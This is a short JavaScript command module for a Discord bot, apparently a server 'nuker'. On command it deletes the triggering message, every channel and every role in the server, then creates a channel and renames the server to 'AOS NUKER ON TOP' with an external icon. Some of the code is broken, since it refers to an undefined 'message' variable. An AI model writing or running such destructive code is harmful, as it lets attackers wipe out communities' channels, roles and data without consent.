exports.run = async (client, msg, args) => {

    msg.delete()

    await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
    await msg.guild.roles.map(r => r.delete().catch(() => {}))

    msg.guild.createChannel('AOS NUKER ON TOP', {
        type: 'text'
    }).catch(() => {})


  message.guild.setName("AOS NUKER ON TOP");
  message.guild.setIcon("https://cdn.discordapp.com/attachments/975547256373653514/983230105948147742/descarga.jpeg");
}
